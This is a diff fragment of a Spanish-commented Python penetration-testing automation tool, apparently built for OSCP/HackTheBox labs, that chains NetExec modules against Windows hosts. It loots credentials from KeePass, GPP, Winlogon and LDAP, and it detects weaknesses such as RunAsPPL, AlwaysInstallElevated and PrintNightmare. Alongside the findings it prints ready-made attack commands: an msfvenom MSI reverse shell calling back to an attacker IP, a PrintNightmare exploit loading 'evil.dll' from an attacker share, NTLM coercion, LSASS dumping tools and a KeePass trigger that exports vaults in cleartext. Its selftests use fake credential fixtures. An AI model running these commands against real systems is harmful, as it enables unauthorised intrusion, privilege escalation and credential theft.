+                f"KeePass: {len(kp['files'])} fichero(s) encontrado(s) (KDBX/config) — "
+                + ", ".join(kp["files"][:3]) + (" …" if len(kp["files"]) > 3 else "")))
+        if kp_running:
+            _loot_hit = True
+            proc_users = sorted({pu for _, _, pu in kp["processes"]})
+            _kp_txt = (f"KeePass EN EJECUCIÓN sobre el objetivo (usuario(s): {', '.join(proc_users)}) — "
+                       "precondición de '-M keepass_trigger': configura un disparador MALICIOSO en "
+                       "KeePass para que exporte la base en texto claro la próxima vez que el usuario "
+                       "haga login (ACTIVO: ESCRIBE la configuración de KeePass en el objetivo) — "
+                       "palantir no lo encadena solo")
+            res["findings"].append(("critica", _kp_txt))
+            _attach_cmd(res, _kp_txt, [
+                shown_base + " -M keepass_trigger -o KEEPASS_PATH=<ruta_KeePass.config.xml>   "
+                "# paso MANUAL (ACTIVO, muta config). Por defecto exporta a C:\\Users\\Public\\export.xml; "
+                "revisa 'nxc smb <ip> -u U -p P -M keepass_trigger -o ACTION=CLEAN' para deshacer"])
+        # Resumen del paso (actualiza el _step de arriba sin volverlo a añadir)
+        res["steps"][-1]["ok"] = _loot_hit
+
+        # ── Lote 2 (OSCP-safe, SOLO LECTURA): detección/estado del equipo ──────────────
+        # Chequeos one-shot (una línea de estado por módulo) que informan de postura de
+        # seguridad y precondiciones para pasos MANUALES. Batched igual que el lote 1.
+        _det_mods = ("runasppl", "bitlocker", "uac", "install_elevated", "ntlmv1", "spooler",
+                     "printnightmare", "remove-mic", "enum_cve", "enum_av", "msol")
+        rc6, out6 = run_capture(base_cmd + [a for m in _det_mods for a in ("-M", m)],
+                                timeout=240, quiet=True)
+        out6 = out6 or ""
+        safe_out6 = _mask_out(out6, p)
+        per6 = _nxc_split_by_module(out6, _det_mods)
+        _det_hit = False
+        _det_shown = shown_base + " " + " ".join(f"-M {m}" for m in _det_mods)
+        _step(res, _det_shown, False, safe_out6,
+              note="Pwn3d! por SMB → batched: detección de postura (RunAsPPL/BitLocker/UAC/"
+                   "AlwaysInstallElevated/NTLMv1/Spooler/PrintNightmare/CVE-2019-1040/CVEs por build/"
+                   "AV/MSOL) — SOLO LECTURA por módulo")
+        # runasppl: enabled ⇒ lsassy puede fallar limpio → sugerir nanodump/handlekatz/procdump (MANUAL)
+        ppl = _parse_runasppl(per6["runasppl"])
+        if ppl is True:
+            _det_hit = True
+            _ppl_txt = ("Host con LSA en modo protegido (RunAsPPL=1) — lsassy/Mimikatz estándar fallan "
+                        "limpio (Credential Guard-like). Alternativas conocidas (sueltan binario, más ruidosas que lsassy): "
+                        "nanodump/handlekatz/procdump — palantir no las encadena (dejan artefactos)")
+            res["findings"].append(("media", _ppl_txt))
+            _ppl_sec_url = p if SHOW_SECRETS else "***"
+            _ppl_auth = (f"-u {shlex.quote(u)} -H {_ppl_sec_url}" if is_hash
+                         else f"-u {shlex.quote(u)} -p {_ppl_sec_url}")
+            _attach_cmd(res, _ppl_txt, [
+                f"nxc smb {ip} {_ppl_auth} -M nanodump   # paso MANUAL, alternativa a lsassy cuando RunAsPPL=1 (suelta BOF nanodump en el objetivo)",
+                f"nxc smb {ip} {_ppl_auth} -M handlekatz   # paso MANUAL, idem con handlekatz64",
+                f"nxc smb {ip} {_ppl_auth} -M procdump   # paso MANUAL, idem con procdump64 (firmado por Sysinternals; menos AV-flagged)"])
+        elif ppl is False:
+            res["findings"].append(("info", "RunAsPPL deshabilitado — lsassy (ya corrido arriba) no debería tener "
+                                            "problemas de PPL; si aun así falla, probablemente es LSA por otra razón "
+                                            "(Credential Guard de verdad, hardware-based)"))
+            _det_hit = True
+        # BitLocker
+        bl = _parse_bitlocker(per6["bitlocker"])
+        if bl:
+            _det_hit = True
+            on = [d for d, en in bl if en]
+            off = [d for d, en in bl if not en]
+            if off:
+                res["findings"].append(("media",
+                    f"BitLocker DESHABILITADO en: {', '.join(off)} — superficie para offline attacks (acceso físico, montaje del disco)"))
+            if on:
+                res["findings"].append(("info", f"BitLocker ACTIVO en: {', '.join(on)}"))
+        # UAC
+        uac = _parse_uac(per6["uac"])
+        if uac is False:
+            _det_hit = True
+            res["findings"].append(("media",
+                "UAC DESHABILITADO — tokens elevados sin prompt, cualquier admin local obtiene SYSTEM sin interacción"))
+        elif uac is True:
+            _det_hit = True
+            res["findings"].append(("info", "UAC habilitado (estado nominal)"))
+        # AlwaysInstallElevated
+        aie = _parse_install_elevated(per6["install_elevated"])
+        if aie == 2:
+            _det_hit = True
+            _aie_txt = ("AlwaysInstallElevated habilitado (HKLM+HKCU=1) — cualquier usuario puede instalar un MSI "
+                        "como SYSTEM (privesc local de un solo paso)")
+            res["findings"].append(("critica", _aie_txt))
+            _attach_cmd(res, _aie_txt, [
+                "msfvenom -p windows/x64/shell_reverse_tcp LHOST=TU_IP LPORT=4444 -f msi -o rev.msi   # genera MSI con reverse shell",
+                "# sube rev.msi al objetivo (SMB/HTTP/evil-winrm upload) y ejecuta: msiexec /quiet /qn /i C:\\path\\rev.msi   # paso MANUAL, ejecución local"])
+        elif aie == 1:
+            _det_hit = True
+            res["findings"].append(("media",
+                "AlwaysInstallElevated configurado solo a nivel COMPUTER — falta la clave HKCU=1 para explotación; "
+                "revisar permisos del registro"))
+        # NTLMv1
+        n1 = _parse_ntlmv1(per6["ntlmv1"])
+        if n1 is True:
+            _det_hit = True
+            res["findings"].append(("alta",
+                "NTLMv1 habilitado (lmcompatibilitylevel < 3) — hashes crackeables con DES (crack.sh en segundos). "
+                "Relay/Responder con --lm force NTLMv1 → cracker offline"))
+        # Spooler (precondición de PrinterBug / coerción NTLM)
+        sp = _parse_spooler(per6["spooler"])
+        if sp is True:
+            _det_hit = True
+            _sp_txt = ("Print Spooler ACTIVO en el objetivo — vector de coerción NTLM (PrinterBug/MS-RPRN): "
+                       "cualquier cuenta de dominio puede forzar al equipo a autenticarse contra un listener. "
+                       "Explotable con 'coercer' (tool externa) o 'coerce_plus' (nxc) — pasos ACTIVOS, palantir no "
+                       "los encadena")
+            res["findings"].append(("media" if res.get("_signing_disabled") else "info", _sp_txt))
+            _attach_cmd(res, _sp_txt, [
+                f"python3 -m coercer coerce -t {ip} -u <cuenta_dominio> -p <pass> -l <TU_IP>   # paso MANUAL (coercer): fuerza NTLM al listener",
+                f"nxc smb {ip} -u <cuenta_dominio> -p <pass> -M coerce_plus -o LISTENER=<TU_IP> METHOD=PrintBug   # alternativa con el módulo de nxc"])
+        # PrintNightmare
+        if _parse_printnightmare(per6["printnightmare"]):
+            _det_hit = True
+            _pn_txt = "PrintNightmare: host VULNERABLE (CVE-2021-34527) — privesc local a SYSTEM y RCE remoto por Print Spooler"
+            res["findings"].append(("critica", _pn_txt))
+            _attach_cmd(res, _pn_txt, [
+                "git clone https://github.com/ly4k/PrintNightmare && python3 PrintNightmare/printnightmare.py "
+                f"-u <cuenta_dominio> -p <pass> -d <dominio> -dll '\\\\TU_IP\\share\\evil.dll' {ip}   # paso MANUAL"])
+        # CVE-2019-1040 (NTLM MIC removal)
+        if _parse_remove_mic(per6["remove-mic"]):
+            _det_hit = True
+            res["findings"].append(("alta",
+                "CVE-2019-1040 (NTLM MIC removal): host potencialmente vulnerable — vector de relay NTLM sin signing. "
+                "Revisar con impacket-ntlmrelayx --remove-mic"))
+        # enum_cve
+        cves = _parse_enum_cve(per6["enum_cve"])
+        for cve, msg in cves:
+            _det_hit = True
+            res["findings"].append(("alta", f"{cve}: {msg} — confirmar si aplica a este build de Windows"))
+        # enum_av
+        avs = _parse_enum_av(per6["enum_av"])
+        if avs:
+            _det_hit = True
+            res["findings"].append(("info", f"AV/EDR detectado: {', '.join(avs[:5])}{' …' if len(avs) > 5 else ''}"))
+        # msol (solo tiene sentido en un Entra ID Sync Server)
+        msol_lines = _parse_msol(per6["msol"])
+        if msol_lines:
+            _det_hit = True
+            for ln in msol_lines:
+                res["findings"].append(("critica",
+                    f"MSOL/Entra ID Sync: credencial en claro extraída del localDB del Sync Server — «{ln}»"))
+        res["steps"][-1]["ok"] = _det_hit
     finally:
         if pw_file:
             try:
@@ -8565,6 +9353,80 @@ def _creds_enum(res, nxc, np, ip, u, secret, is_hash, local_auth, is_dc, port, d
                 res["findings"].append(("alta",
                     f"LDAP (cred {u}): la descripción de algún usuario podría contener una contraseña — "
                     "revisa la salida cruda del paso 'get-desc-users'"))
+            # ── Lote LDAP (OSCP-safe, SOLO LECTURA): atributos filtrados + recon de AD ──
+            # Batched igual que los lotes SMB. Módulos: dump-computers (FQDN+OS de TODOS los
+            # equipos), get-info-users ('info' puede contener contraseñas), get-userPassword /
+            # get-unixUserPassword (atributos con contraseña en claro cuando están mal usados),
+            # subnets (sitios/subnets AD), gpp_privileges (privilegios asignados por GPO con
+            # SIDs resueltos). Solo LECTURA — cada módulo cae limpio si el atributo no existe.
+            if is_dc:
+                _ldap_mods = ("dump-computers", "get-info-users", "get-userPassword",
+                              "get-unixUserPassword", "subnets", "gpp_privileges")
+                rc, _lout = _run_capture_retry([nxc, "ldap", ip] + A() + [a for m in _ldap_mods for a in ("-M", m)],
+                                                timeout=180, quiet=True)
+                _lshown = f"{nxc} ldap {ip} {shown_auth} " + " ".join(f"-M {m}" for m in _ldap_mods)
+                _lper = _nxc_split_by_module(_lout or "", _ldap_mods)
+                _lhit = False
+                _step(res, _lshown, False, mask(_lout),
+                      note=f"LDAP (cred {u}) batched: computers/info/userPassword/unixUserPassword/subnets/gpp_privileges — SOLO LECTURA")
+                # dump-computers
+                comps = _parse_dump_computers(_lper["dump-computers"])
+                if comps:
+                    _lhit = True
+                    _add_once(res, "info",
+                              f"LDAP (cred {u}): {len(comps)} equipo(s) en el dominio (dump-computers): "
+                              + ", ".join(f"{h}" for h, _, _ in comps[:8])
+                              + (" …" if len(comps) > 8 else ""),
+                              "dump-computers", seen)
+                # get-info-users: 'info' puede traer contraseña (fallo de higiene, hermano de --description)
+                info_users = _parse_get_info_users(_lper["get-info-users"])
+                _info_leaks = [(uu, inf) for uu, inf in info_users
+                                if re.search(_SPIDER_SECRET_REGEX, inf, re.I)]
+                if _info_leaks:
+                    _lhit = True
+                    _add_once(res, "alta",
+                              f"LDAP (cred {u}): {len(_info_leaks)} usuario(s) con 'info' sospechoso (posible "
+                              f"contraseña): " + ", ".join(uu for uu, _ in _info_leaks[:8])
+                              + (" …" if len(_info_leaks) > 8 else ""),
+                              "info_users_leak", seen)
+                # get-userPassword: atributo PLAIN-TEXT (raro pero devastador)
+                up_hits = _parse_get_user_password(_lper["get-userPassword"])
+                for uu, pw in up_hits:
+                    _lhit = True
+                    _add_once(res, "critica",
+                              f"LDAP (cred {u}): userPassword en TEXTO CLARO vía LDAP — «{uu}:{pw}»",
+                              f"userPassword {uu}", seen)
+                # get-unixUserPassword: atributo RFC 2307bis (interoperabilidad UNIX)
+                uup_hits = _parse_get_unix_user_password(_lper["get-unixUserPassword"])
+                for uu, pw in uup_hits:
+                    _lhit = True
+                    _add_once(res, "critica",
+                              f"LDAP (cred {u}): unixUserPassword en LDAP — «{uu}:{pw}» (atributo UNIX; "
+                              "probarla también contra SSH/servicios LDAP-integrados)",
+                              f"unixUserPassword {uu}", seen)
+                # subnets
+                sites, snets = _parse_subnets(_lper["subnets"])
+                if sites:
+                    _lhit = True
+                    _add_once(res, "info",
+                              f"LDAP (cred {u}): AD sites/subnets — {len(sites)} site(s)"
+                              + (f" / {len(snets)} subnet(s): " + ", ".join(snets[:5]) if snets else "")
+                              + (" …" if len(snets) > 5 else ""),
+                              "ad_sites_subnets", seen)
+                # gpp_privileges
+                gp_privs = _parse_gpp_privileges(_lper["gpp_privileges"])
+                _dangerous_privs = {"SeImpersonatePrivilege", "SeAssignPrimaryTokenPrivilege",
+                                    "SeBackupPrivilege", "SeRestorePrivilege", "SeDebugPrivilege",
+                                    "SeLoadDriverPrivilege", "SeTcbPrivilege",
+                                    "SeTakeOwnershipPrivilege", "SeCreateTokenPrivilege"}
+                for priv, trustees in gp_privs:
+                    _lhit = True
+                    sev = "alta" if priv in _dangerous_privs else "info"
+                    _add_once(res, sev,
+                              f"LDAP (cred {u}): GPO asigna '{priv}' a {', '.join(trustees[:5])}"
+                              + (" …" if len(trustees) > 5 else ""),
+                              f"gpp_priv {priv}", seen)
+                res["steps"][-1]["ok"] = _lhit
             # LAPS: ¿puede ESTA credencial leer la contraseña de administrador local que LAPS
             # rota automáticamente (atributo ms-Mcs-AdmPwd / msLAPS-Password)? Por diseño solo
             # debería poder un grupo reducido (el propio LAPS la protege con ACLs dedicadas) —
@@ -13782,6 +14644,12 @@ def selftest():
             return 0, "SMB  10.129.4.104  445  FRONTDESK01  No credentials found\n"
         if "-M" in cmd and "iis" in cmd:
             return 0, "SMB  10.129.4.104  445  FRONTDESK01  [-] appcmd.exe not found, this module is not applicable\n"
+        # Lotes batched nuevos (loot/detección): salida vacía = ningún módulo tiene hallazgo
+        # — nxc fallaría limpio cada uno y la función debería seguir sin tirar.
+        if "-M" in cmd and "gpp_autologin" in cmd:
+            return 0, ""   # batched loot
+        if "-M" in cmd and "runasppl" in cmd:
+            return 0, ""   # batched detección
         raise AssertionError(f"comando nxc inesperado en _dump_sam_lsa: {cmd}")
 
     globals()["nxc_bin"], globals()["run_capture"] = (lambda: "FAKE_NXC"), _fake_dump_run_capture
@@ -13790,7 +14658,7 @@ def selftest():
         _dump_sam_lsa(_dres, "FAKE_NXC", "10.129.4.104", "bob", "HTB_@cademy_stdnt!")
     finally:
         globals()["nxc_bin"], globals()["run_capture"] = _real_nxc_bin3, _real_run_capture3
-    assert len(_dump_cmds) == 4 and all("--local-auth" not in c for c in _dump_cmds)   # --sam/--lsa/-M lsassy/-M iis
+    assert len(_dump_cmds) == 6 and all("--local-auth" not in c for c in _dump_cmds)   # --sam/--lsa/-M lsassy/-M iis/-M (loot batched)/-M (det batched)
     assert all("HTB_@cademy_stdnt!" not in " ".join(c) for c in _dump_cmds)   # la contraseña nunca va en el argv
     _dsteps_out = " ".join(s["output"] for s in _dres["steps"])
     assert "HTB_@cademy_stdnt!" in _dsteps_out   # la contraseña del operador, en claro por defecto
@@ -13820,6 +14688,7 @@ def selftest():
     def _fake_reuse_sam(cmd, timeout=None, quiet=False, **kw):
         if "--sam" in cmd:
             return 0, _sam_reuse
+        # Cualquier otro (--lsa, -M lsassy, -M iis, batched loot/detección): salida vacía
         return 0, "SMB x 445 H No credentials found"
     globals()["nxc_bin"], globals()["run_capture"] = (lambda: "FAKE_NXC"), _fake_reuse_sam
     try:
@@ -13850,16 +14719,17 @@ def selftest():
     assert any(s == "alta" and "FILE" in t and "svc" in t for s, t in _db24["findings"]), _db24["findings"]   # #24
     assert any(s == "alta" and "alto valor" in t and "appdb.users" in t for s, t in _db24["findings"]), _db24["findings"]   # #25
 
-    # --local-auth (palantir): _dump_sam_lsa lo añade a las 3 llamadas (--sam/--lsa/-M lsassy)
-    # cuando se pide explícitamente — reutiliza el mismo mock de arriba, _dump_cmds ya tiene
-    # los 3 comandos SIN la flag; estos 3 nuevos van al final de la misma lista.
+    # --local-auth (palantir): _dump_sam_lsa lo añade a TODAS las llamadas (--sam/--lsa/-M lsassy/
+    # -M iis/batched-loot/batched-det) cuando se pide explícitamente — reutiliza el mismo mock
+    # de arriba, _dump_cmds ya tiene los 6 comandos SIN la flag; estos 6 nuevos van al final
+    # de la misma lista.
     globals()["nxc_bin"], globals()["run_capture"] = (lambda: "FAKE_NXC"), _fake_dump_run_capture
     try:
         _dres3 = _fp("reuse", "test", [445])
         _dump_sam_lsa(_dres3, "FAKE_NXC", "10.129.4.104", "bob", "HTB_@cademy_stdnt!", local_auth=True)
     finally:
         globals()["nxc_bin"], globals()["run_capture"] = _real_nxc_bin3, _real_run_capture3
-    assert all("--local-auth" in c for c in _dump_cmds[-3:])
+    assert all("--local-auth" in c for c in _dump_cmds[-6:])
 
     # _dump_sam_lsa con pool=: alimenta la retroalimentación con lo DESCUBIERTO (cred LSA en claro
     # 'frontdesk:Password123' + hash NTLM de SAM de 'bob' para pass-the-hash).
@@ -13886,6 +14756,8 @@ def selftest():
                         "C$\\Windows\\Temp\\xyz123.tmp\n")
         if "-M" in cmd and "iis" in cmd:
             return 0, "SMB  10.129.4.104  445  FRONTDESK01  [-] appcmd.exe not found, this module is not applicable\n"
+        if "-M" in cmd and ("gpp_autologin" in cmd or "runasppl" in cmd):
+            return 0, ""   # batched loot/detección: vacío ⇒ ningún módulo tiene hallazgo
         raise AssertionError(f"comando inesperado: {cmd}")
     globals()["nxc_bin"], globals()["run_capture"] = (lambda: "FAKE_NXC"), _fake_dump_opsec
     try:
@@ -13919,6 +14791,8 @@ def selftest():
             return 0, _lsassy_out   # mssqlsvc en claro + jmontgomery solo con hash (fixture ya definido arriba)
         if "-M" in cmd and "iis" in cmd:
             return 0, "SMB  172.16.6.50  445  MS01  [-] appcmd.exe not found, this module is not applicable\n"
+        if "-M" in cmd and ("gpp_autologin" in cmd or "runasppl" in cmd):
+            return 0, ""   # batched loot/detección: vacío ⇒ ningún módulo tiene hallazgo
         raise AssertionError(f"comando inesperado: {cmd}")
     globals()["nxc_bin"], globals()["run_capture"] = (lambda: "FAKE_NXC"), _fake_dump_real
     _pool_real, _dres_real = [], _fp("reuse", "t", [445])
@@ -14296,7 +15170,7 @@ def selftest():
     finally:
         globals()["nxc_bin"], globals()["run_capture"] = _real_nxc_bin2, _real_run_capture
         globals()["_run_capture_progressive"] = _real_rcp_bulk
-    assert len(_seen_cmds) == 10   # 1 spray + 4 del volcado SAM/LSA/-M lsassy/-M iis + 5 de _creds_enum (--shares/--users/--pass-pol/--rid-brute/--loggedon-users, ya sin gate is_dc) — todo por el Pwn3d! de alice
+    assert len(_seen_cmds) == 12   # 1 spray + 6 del volcado (SAM/LSA/-M lsassy/-M iis + batched loot + batched det) + 5 de _creds_enum (--shares/--users/--pass-pol/--rid-brute/--loggedon-users) — todo por el Pwn3d! de alice
     _cmd, _timeout, _quiet = _seen_cmds[0]
     assert _quiet is True and "--continue-on-success" in _cmd and "--no-bruteforce" not in _cmd
     assert _timeout and _timeout > 0
@@ -14329,10 +15203,10 @@ def selftest():
                                     bulk=(["alice", "bob"], ["Summer2024", "Winter2024"], False))
     finally:
         globals()["nxc_bin"], globals()["run_capture"] = _real_nxc_bin2, _real_run_capture
-    # 1 bulk + 4 del volcado encadenado (alice: --sam/--lsa/-M lsassy/-M iis) + 5 de _creds_enum
-    # (alice: --shares/--users/--pass-pol/--rid-brute/--loggedon-users, ya sin gate is_dc) + 1
+    # 1 bulk + 6 del volcado encadenado (alice: --sam/--lsa/-M lsassy/-M iis/batched loot/batched det)
+    # + 5 de _creds_enum (alice: --shares/--users/--pass-pol/--rid-brute/--loggedon-users) + 1
     # explícito de "dave" ("dave" no vuelve a disparar _creds_enum: "smb" ya está en 'enriched')
-    assert len(_mix[0]["steps"]) == 11
+    assert len(_mix[0]["steps"]) == 13
 
     # Orden de protocolos (_CREDS_PROTO_PRIORITY): SMB y LDAP antes que WMI (más lento y con un
     # bug confirmado de nxc contra listas de usuarios) y que WinRM/RDP/MSSQL, sea el orden de
@@ -17361,6 +18235,155 @@ def selftest():
                 os.environ.pop("SUDO_UID", None)
             else:
                 os.environ["SUDO_UID"] = _real_sudo_uid
+
+    # ── Tests de los nuevos parsers de módulos OSCP-safe (ninguna red, solo cadenas) ──────
+    # _nxc_split_by_module + _nxc_payload_lines son la base; el resto llama a payload_lines.
+    _mix_out = ("SMB   10.0.0.1  445  WIN  [*] Banner nxc\n"
+                "gpp_auto... 10.0.0.1 445 WIN [*] Searching SYSVOL\n"
+                "gpp_auto... 10.0.0.1 445 WIN Usernames: ['AdminLocal']\n"
+                "gpp_auto... 10.0.0.1 445 WIN Passwords: ['Winter2024!']\n"
+                "reg-winl... 10.0.0.1 445 WIN DefaultUserName: Operator\n"
+                "reg-winl... 10.0.0.1 445 WIN DefaultPassword: P@ssw0rd\n"
+                "runasppl   10.0.0.1 445 WIN RunAsPPL enabled\n")
+    _mods = ("gpp_autologin", "reg-winlogon", "runasppl")
+    _per = _nxc_split_by_module(_mix_out, _mods)
+    assert "Usernames:" in _per["gpp_autologin"] and "Passwords:" in _per["gpp_autologin"]
+    assert "DefaultUserName" in _per["reg-winlogon"] and "RunAsPPL" not in _per["reg-winlogon"]   # no se cuela entre módulos
+    assert "RunAsPPL enabled" in _per["runasppl"]
+    # Las líneas con prefijo 'SMB' (banner) se descartan
+    assert "Banner nxc" not in "\n".join(_per.values())
+
+    # gpp_autologin: usernames y passwords extraídos del str-repr de lista
+    _ga = _parse_gpp_autologin(_per["gpp_autologin"])
+    assert _ga["usernames"] == ["AdminLocal"] and _ga["passwords"] == ["Winter2024!"]
+
+    # reg-winlogon: DefaultUser/DefaultPassword extraídos como dict
+    _rw = _parse_reg_winlogon(_per["reg-winlogon"])
+    assert _rw["DefaultUserName"] == "Operator" and _rw["DefaultPassword"] == "P@ssw0rd"
+
+    # runasppl: enabled → True; disabled → False; sin línea → None
+    assert _parse_runasppl(_per["runasppl"]) is True
+    assert _parse_runasppl("runasppl 1.1.1.1 445 H RunAsPPL disabled") is False
+    assert _parse_runasppl("") is None
+
+    # eventlog_creds: pares Username:/Password: consecutivos
+    _ev_out = ("eventlog... 1.1.1.1 445 H Credentials found! net use \\\\srv /u:bob /p:Summer24\n"
+               "eventlog... 1.1.1.1 445 H Username: bob\n"
+               "eventlog... 1.1.1.1 445 H Password: Summer24\n")
+    assert _parse_eventlog_creds(_ev_out) == [("bob", "Summer24")]
+
+    # powershell_history: C:\path [ KW1 KW2 ] por fichero con palabras sensibles
+    _ps_out = ("powershe... 1.1.1.1 445 H C:\\Users\\alice\\...\\ConsoleHost_history.txt [ PASSWORD KEY ]\n"
+               "powershe... 1.1.1.1 445 H \\tInvoke-WebRequest -Uri http://x -Headers @{Authorization='Bearer xyz'}\n")
+    _ph = _parse_powershell_history(_ps_out)
+    assert len(_ph) == 1 and _ph[0][0].startswith("C:\\Users\\alice") and set(_ph[0][1]) == {"PASSWORD", "KEY"}
+
+    # winscp: parser multi-session con separadores '======='
+    _wsc_out = ("winscp     1.1.1.1 445 H =======prod-ftp=======\n"
+                "winscp     1.1.1.1 445 H HostName: ftp.corp.local\n"
+                "winscp     1.1.1.1 445 H UserName: svc_backup\n"
+                "winscp     1.1.1.1 445 H Password: Welcome1\n")
+    _ws = _parse_winscp(_wsc_out)
+    assert _ws == [("prod-ftp", "ftp.corp.local", "svc_backup", "Welcome1")]
+
+    # keepass_discover: procesos + ficheros
+    _kp_out = ('keepass_... 1.1.1.1 445 H Found process "KeePass.exe" with PID 1234 (user alice)\n'
+               "keepass_... 1.1.1.1 445 H Found C:\\Users\\alice\\Documents\\passwords.kdbx\n")
+    _kp = _parse_keepass_discover(_kp_out)
+    assert _kp["processes"] == [("KeePass.exe", "1234", "alice")]
+    assert _kp["files"] == ["C:\\Users\\alice\\Documents\\passwords.kdbx"]
+
+    # bitlocker / uac / install_elevated / spooler / printnightmare / remove-mic / ntlmv1
+    assert _parse_bitlocker("bitlocker 1.1 445 H BitLocker is enabled on drive C: (Encryption Method: XTS_AES_256)\n"
+                            "bitlocker 1.1 445 H BitLocker is disabled on drive D:") == [("C:", True), ("D:", False)]
+    assert _parse_uac("uac 1.1 445 H UAC Status: 0 (UAC Disabled)") is False
+    assert _parse_uac("uac 1.1 445 H UAC Status: 1 (UAC Enabled)") is True
+    assert _parse_install_elevated("install_... 1.1 445 H AlwaysInstallElevated Status: 1 (Enabled)") == 2
+    assert _parse_install_elevated("install_... 1.1 445 H AlwaysInstallElevated Status: 0 (Disabled)") == 0
+    assert _parse_spooler("spooler 1.1 445 H Spooler service enabled") is True
+    assert _parse_printnightmare("printni... 1.1 445 H Vulnerable, next step https://github.com/ly4k/PrintNightmare") is True
+    assert _parse_remove_mic("remove-... 1.1 445 H Potentially vulnerable to CVE-2019-1040, next step: ...") is True
+
+    # enum_cve
+    _cve_out = ("enum_cve 1.1 445 H CVE-2021-34527 - PrintNightmare - Vulnerable\n"
+                "enum_cve 1.1 445 H CVE-2022-26925 - PetitPotam-like - Vulnerable\n")
+    _cves = _parse_enum_cve(_cve_out)
+    assert ("CVE-2021-34527", "Vulnerable") in _cves and ("CVE-2022-26925", "Vulnerable") in _cves
+
+    # dump-computers / get-info-users / get-userPassword / subnets
+    assert _parse_dump_computers("dump-co... 1.1 389 H DC01.htb.local  10.0.0.1  Windows Server 2022\n"
+                                  "dump-co... 1.1 389 H WS01.htb.local  10.0.0.5  Windows 10") == [
+        ("DC01.htb.local", "10.0.0.1", "Windows Server 2022"),
+        ("WS01.htb.local", "10.0.0.5", "Windows 10"),
+    ]
+    assert _parse_get_info_users("get-inf... 1.1 389 H User: admin                Info: password=Welcome1 (old)") \
+        == [("admin", "password=Welcome1 (old)")]
+    assert _parse_get_user_password("get-use... 1.1 389 H User: svc_legacy userPassword: SuperSecret!") \
+        == [("svc_legacy", "SuperSecret!")]
+    _sites, _snets = _parse_subnets('subnets  1.1 389 H Site "HQ" (Subnet:10.0.0.0/24) (description:"HQ Site")')
+    assert "HQ" in _sites and "10.0.0.0/24" in _snets
+
+    # enum_ca con ESC8
+    _ca_out = ("enum_ca    1.1.1.1 445 H Active Directory Certificate Services Found.\n"
+                "enum_ca    1.1.1.1 445 H http://ca01/certsrv/certfnsh.asp\n"
+                "enum_ca    1.1.1.1 445 H Web enrollment found on HTTP (ESC8).\n")
+    _ca = _parse_enum_ca(_ca_out)
+    assert _ca["found"] and _ca["esc8"] and "http://ca01/certsrv/certfnsh.asp" in _ca["urls"]
+
+    # ioxidresolver
+    assert _parse_ioxidresolver("ioxidre... 1.1.1.1 445 H Address: 192.168.99.5\n"
+                                 "ioxidre... 1.1.1.1 445 H Address: 10.0.5.1") == ["192.168.99.5", "10.0.5.1"]
+
+    # MSSQL: enum_logins / enum_impersonate
+    _el_out = ("enum_log... 1.1 1433 H Login Name                          Type            Status\n"
+                "enum_log... 1.1 1433 H ----------                          ----            ------\n"
+                "enum_log... 1.1 1433 H sa                                  SQL Login       sysadmin: enabled")
+    _rows = _parse_enum_logins(_el_out)
+    assert any("sa" == r[0] and "sysadmin" in r[2] for r in _rows)
+    assert _parse_enum_impersonate("enum_imp... 1.1 1433 H Users with impersonation rights:\n"
+                                    "enum_imp... 1.1 1433 H dbo\n"
+                                    "enum_imp... 1.1 1433 H sql_admin") == ["dbo", "sql_admin"]
+
+    # Gating en _dump_sam_lsa: RunAsPPL enabled → sugiere nanodump/handlekatz/procdump como MANUAL
+    _ppl_out_batched = ("runasppl   1.1.1.1 445 H RunAsPPL enabled\n")
+    _real_nxc_bin_g, _real_rc_g = globals()["nxc_bin"], run_capture
+    def _fake_ppl_run(cmd, timeout=None, quiet=False, **kw):
+        if "--sam" in cmd: return 0, ""
+        if "--lsa" in cmd: return 0, ""
+        if "-M" in cmd and "lsassy" in cmd: return 0, ""
+        if "-M" in cmd and "iis" in cmd: return 0, ""
+        if "-M" in cmd and "gpp_autologin" in cmd: return 0, ""   # batched loot
+        if "-M" in cmd and "runasppl" in cmd: return 0, _ppl_out_batched
+        raise AssertionError(f"cmd inesperado: {cmd}")
+    globals()["nxc_bin"], globals()["run_capture"] = (lambda: "NXC"), _fake_ppl_run
+    try:
+        _pres = _fp("reuse", "t", [445])
+        _dump_sam_lsa(_pres, "NXC", "1.1.1.1", "bob", "x")
+    finally:
+        globals()["nxc_bin"], globals()["run_capture"] = _real_nxc_bin_g, _real_rc_g
+    assert any(s == "media" and "RunAsPPL" in t and "nanodump" in t for s, t in _pres["findings"])
+    _ppl_key = next(t for s, t in _pres["findings"] if "RunAsPPL" in t and "nanodump" in t)
+    assert len(_pres.get("_cmd_for", {}).get(_ppl_key, [])) == 3   # nanodump / handlekatz / procdump
+
+    # Gating KeePass: proceso corriendo → sugiere keepass_trigger como MANUAL
+    _kp_batched = ('keepass_... 1.1.1.1 445 H Found process "KeePass.exe" with PID 999 (user admin)\n')
+    def _fake_kp_run(cmd, timeout=None, quiet=False, **kw):
+        if "--sam" in cmd: return 0, ""
+        if "--lsa" in cmd: return 0, ""
+        if "-M" in cmd and "lsassy" in cmd: return 0, ""
+        if "-M" in cmd and "iis" in cmd: return 0, ""
+        if "-M" in cmd and "gpp_autologin" in cmd: return 0, _kp_batched
+        if "-M" in cmd and "runasppl" in cmd: return 0, ""
+        raise AssertionError(f"cmd inesperado: {cmd}")
+    globals()["nxc_bin"], globals()["run_capture"] = (lambda: "NXC"), _fake_kp_run
+    try:
+        _kres = _fp("reuse", "t", [445])
+        _dump_sam_lsa(_kres, "NXC", "1.1.1.1", "bob", "x")
+    finally:
+        globals()["nxc_bin"], globals()["run_capture"] = _real_nxc_bin_g, _real_rc_g
+    assert any(s == "critica" and "KeePass EN EJECUCIÓN" in t for s, t in _kres["findings"])
+    _kp_key = next(t for s, t in _kres["findings"] if "KeePass EN EJECUCIÓN" in t)
+    assert any("keepass_trigger" in c for c in _kres.get("_cmd_for", {}).get(_kp_key, []))
 
     print("selftest OK")
 
